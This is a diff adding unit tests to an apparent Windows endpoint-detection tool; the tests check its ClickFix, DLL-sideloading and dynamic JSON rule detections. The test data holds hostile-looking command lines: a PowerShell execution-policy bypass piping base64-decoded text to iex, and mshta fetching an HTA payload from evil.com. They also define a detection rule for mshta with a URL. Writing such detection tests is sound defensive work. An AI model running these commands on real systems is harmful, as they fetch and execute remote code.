@@ -125,5 +125,107 @@ namespace WindowsSentinel.Tests
             Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
             Assert.Contains("Junction LPE", result.Evidence);
         }
+
+        [Fact]
+        public void ClickFixDetectionRule_DetectsSuspiciousDownloaderFromExplorer()
+        {
+            var rule = new ClickFixDetectionRule();
+
+            var pt = new ProcessTelemetry
+            {
+                ProcessName = "powershell.exe",
+                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                CommandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"[System.Convert]::FromBase64String('aGVsbG8=') | iex\"",
+                ParentProcessName = "explorer.exe",
+                ProcessId = 1241
+            };
+            var result = rule.Evaluate(MakeContext(pt));
+            Assert.NotNull(result);
+            Assert.Equal("ClickFixDetectionRule", result.RuleName);
+            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
+            Assert.Contains("Click-Fix", result.Evidence);
+        }
+
+        [Fact]
+        public void DllSideloadingDetectionRule_DetectsSignedToolInWriteablePath()
+        {
+            var rule = new DllSideloadingDetectionRule();
+
+            var pt = new ProcessTelemetry
+            {
+                ProcessName = "onedrive.exe",
+                ImagePath = @"C:\Users\Admin\AppData\Local\Microsoft\OneDrive\onedrive.exe",
+                CommandLine = "onedrive.exe /background",
+                ProcessId = 1242
+            };
+            var result = rule.Evaluate(MakeContext(pt));
+            Assert.NotNull(result);
+            Assert.Equal("DllSideloadingDetectionRule", result.RuleName);
+            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
+            Assert.Contains("sideloading", result.Reasoning, StringComparison.OrdinalIgnoreCase);
+        }
+
+        [Fact]
+        public void DynamicRulesEvaluator_CorrectlyLoadsAndEvaluatesRules()
+        {
+            // Setup a temporary directory for test rules
+            string tempDir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SentinelTestRules_" + Guid.NewGuid().ToString("N"));
+            System.IO.Directory.CreateDirectory(tempDir);
+            try
+            {
+                var testRule = new
+                {
+                    Name = "TestMshtaUrl",
+                    EventType = "ProcessTelemetry",
+                    Conditions = new[]
+                    {
+                        new { Field = "ProcessName", Operator = "Equals", Value = "mshta.exe" },
+                        new { Field = "CommandLine", Operator = "Contains", Value = "http" }
+                    },
+                    Confidence = 0.95,
+                    Tier = "Tier1Behavioral",
+                    ResponseAction = "KillProcessTree",
+                    Evidence = "Triggered test rule on {CommandLine}",
+                    Reasoning = "Matches mshta with remote URL.",
+                    SignalType = "SuspiciousProcess"
+                };
+
+                string jsonContent = System.Text.Json.JsonSerializer.Serialize(testRule);
+                System.IO.File.WriteAllText(System.IO.Path.Combine(tempDir, "test_rule.json"), jsonContent);
+
+                // Initialize evaluator pointed to test directory
+                var logger = new Microsoft.Extensions.Logging.Abstractions.NullLogger<DynamicRulesEvaluator>();
+                using var evaluator = new DynamicRulesEvaluator(tempDir, logger);
+
+                var pt = new ProcessTelemetry
+                {
+                    ProcessName = "mshta.exe",
+                    ImagePath = @"C:\Windows\System32\mshta.exe",
+                    CommandLine = "mshta.exe http://evil.com/payload.hta",
+                    ProcessId = 1243
+                };
+
+                var context = new FusedTelemetryContext
+                {
+                    ProcessId = pt.ProcessId,
+                    ProcessName = pt.ProcessName,
+                    TriggeringEvent = pt
+                };
+
+                var result = evaluator.Evaluate(context);
+                Assert.NotNull(result);
+                Assert.Equal("DynamicRule:TestMshtaUrl", result.RuleName);
+                Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
+                Assert.Equal(0.95, result.Confidence);
+                Assert.Contains("Triggered test rule on mshta.exe http://evil.com/payload.hta", result.Evidence);
+            }
+            finally
+            {
+                if (System.IO.Directory.Exists(tempDir))
+                {
+                    System.IO.Directory.Delete(tempDir, true);
+                }
+            }
+        }
     }
 }
